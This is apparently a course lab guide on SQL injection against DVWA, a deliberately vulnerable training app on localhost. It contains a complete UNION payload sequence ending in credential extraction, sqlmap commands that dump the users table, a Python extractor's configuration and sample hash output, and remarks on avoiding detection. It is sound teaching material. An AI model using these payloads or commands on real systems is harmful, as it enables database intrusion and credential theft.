# Lab Guide: Week 8 — UNION SQLi, SQLmap, and Python Automation

---

## Part 1: UNION-Based Table Enumeration (DVWA)

**Environment:** DVWA Security Level: Low
**URL:** `http://127.0.0.1/dvwa/vulnerabilities/sqli/`

### Complete Payload Sequence

Run these payloads **in order**. Each builds on the previous result.

**Payload 1 — Confirm injection:**
```
Input: '
Expected: MariaDB syntax error
```

**Payload 2 — Column count (ORDER BY):**
```
Input: ' ORDER BY 2-- -   → Normal response
Input: ' ORDER BY 3-- -   → Error: Unknown column '3'
Conclusion: 2 columns exactly
```

**Payload 3 — Validate with NULL method:**
```
Input: ' UNION SELECT NULL, NULL-- -
Expected: No error (validates column count without data type issues)
```

**Payload 4 — Map output positions:**
```
Input: 0' UNION SELECT 1, 2-- -
Expected: First name = 1, Surname = 2
Note: id=0 suppresses the real admin row — only injected data appears
```

**Payload 5 — Database context:**
```
Input: 0' UNION SELECT database(), user()-- -
Expected: First name = dvwa, Surname = app@localhost
```

**Payload 6 — Table enumeration:**
```
Input: 0' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -
Expected: guestbook, users
```

**Payload 7 — Column enumeration:**
```
Input: 0' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -
Expected: user_id, first_name, last_name, user, password, avatar...
```

**Payload 8 — Credential extraction:**
```
Input: 0' UNION SELECT user, password FROM users-- -
Expected: 5 username:hash pairs
```

### Document Your Results

```
Tables found: [list]
Columns in users: [list]
Credentials:
  [user]: [hash]
  [user]: [hash]
  (etc.)
Hashes cracked (CrackStation.net): [user]:[plaintext]
```

---

## Part 2: SQLmap on DVWA

### Setup

```bash
# Verify sqlmap is installed
sqlmap --version

# If not installed (Kali Linux)
sudo apt-get install sqlmap
```

### Step 1: Get Session Cookie

```
1. Login to DVWA in browser
2. DevTools (F12) → Application → Cookies → 127.0.0.1
3. Copy PHPSESSID value (32-character hex string)
```

### Step 2: Run Staged Commands

**Stage 1 — Enumerate databases only:**
```bash
sqlmap \
  -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=[your_cookie]; security=low" \
  --batch \
  --dbs
```
Expected: Lists dvwa, information_schema, mysql, performance_schema

**Stage 2 — Enumerate tables in dvwa:**
```bash
sqlmap \
  -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=[your_cookie]; security=low" \
  --batch \
  -D dvwa --tables
```
Expected: guestbook, users

**Stage 3 — Dump users table only:**
```bash
sqlmap \
  -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=[your_cookie]; security=low" \
  --batch \
  -D dvwa -T users --dump
```
Expected: Full users table with auto-cracked passwords

### Document Your SQLmap Output

```
Injection types detected: [list from sqlmap output]
Databases found: [list]
Tables in dvwa: [list]
Users extracted: [count]
Passwords cracked by sqlmap: [count]
Total requests (check output): [number]
```

### Compare with Manual (Week 7 + Week 8)

```
Manual approach:
  Requests: ~12
  Time: ~40 minutes
  Noise: Minimal
  WAF bypass: Possible (custom payloads)

SQLmap approach:
  Requests: [from your output]
  Time: [from your output]
  Noise: High (IDS would alert immediately)
  WAF bypass: Possible with --tamper flags

Conclusion: [write your own]
```

---

## Part 3: Python Automation Script

### Setup

```bash
# Install requests library
pip install requests

# Or with pip3
pip3 install requests
```

### Configure the Script

Edit `dvwa-sqli-extractor.py`:

```python
# Line 9: Set your DVWA IP (127.0.0.1 for local)
target_url = "http://127.0.0.1/dvwa/vulnerabilities/sqli/"

# Line 14: Replace with your actual session cookie
"PHPSESSID": "your_actual_phpsessid_here",
```

### Run the Script

```bash
python3 dvwa-sqli-extractor.py
```

### Expected Output

```
[*] DVWA SQLi Automated Extraction Script
[*] Method: UNION-Based In-Band SQL Injection
------------------------------------------------------------
[*] Stage 1 — Enumerating tables in current database...
[+] Column 1: NULL | Column 2: guestbook
[+] Column 1: NULL | Column 2: users

[*] Stage 2 — Enumerating columns in users table...
[+] Column 1: NULL | Column 2: user_id
[+] Column 1: NULL | Column 2: first_name
[+] Column 1: NULL | Column 2: user
[+] Column 1: NULL | Column 2: password
...

[*] Stage 3 — Extracting credentials...
[+] Column 1: admin   | Column 2: 5f4dcc3b5aa765d61d8327deb882cf99
[+] Column 1: gordonb | Column 2: e99a18c428cb38d5f260853678922e03
[+] Column 1: 1337    | Column 2: 8d3533d75ae2c3966d7e0d4fcc69216b
[+] Column 1: pablo   | Column 2: 0d107d09f5bbe40cade3de5c71e9e9b7
[+] Column 1: smithy  | Column 2: 5f4dcc3b5aa765d61d8327deb882cf99
------------------------------------------------------------
[*] Extraction complete. Total requests sent: 3
```

### Troubleshooting

**Problem: "[-] No data extracted"**
```
Check:
1. Is DVWA running? Visit http://127.0.0.1/dvwa/ in browser
2. Is cookie valid? Login again, copy fresh PHPSESSID
3. Is security level Low? DVWA → DVWA Security → Set to Low
4. Does target_url match your DVWA installation path?
   Common paths: /dvwa/, /DVWA/, /
```

**Problem: "[-] Request failed: Connection refused"**
```
DVWA server is not running.
Start Apache/XAMPP/LAMP:
  Linux: sudo service apache2 start
  Windows XAMPP: Start Apache in XAMPP Control Panel
```

### Extend the Script (Optional Exercise)

Add a Stage 4 to extract guestbook table:
```python
print("[*] Stage 4 — Extracting guestbook...")
payload_guest = "0' UNION SELECT comment, name FROM guestbook-- -"
html = exploit_sqli(payload_guest)
if html:
    extract_data(html)
```

---

## Part 4: Comparison Exercise

After completing all three parts, document:

```
Tool          | Requests | Time  | Data Accuracy | Detection Risk
------------- |----------|-------|---------------|---------------
Manual        | ~12      | ~40m  | 100%          | Very Low
Python script | 3        | <5s   | 100%          | Very Low
SQLmap        | [count]  | [t]   | 100%          | HIGH (immediate)

When you would use each:
Manual:        [your answer]
Python script: [your answer]
SQLmap:        [your answer]
```

---

## Completion Checklist

### UNION SQLi
- [✓] All 8 payloads run in order
- [✓] Tables enumerated (guestbook, users)
- [✓] Columns enumerated (user, password confirmed)
- [✓] All 5 credentials extracted
- [✓] All 5 hashes cracked

### SQLmap
- [✓] Session cookie obtained from browser
- [✓] Staged commands run (dbs → tables → dump)
- [✓] Injection types documented
- [✓] Total request count noted
- [✓] Compared with manual approach

### Python Script
- [✓] requests library installed
- [✓] Cookie configured in script
- [✓] Script runs successfully
- [✓] All 3 stages produce output
- [✓] Output matches manual results

---

**Status:** Week 8 Lab Guide | Complete
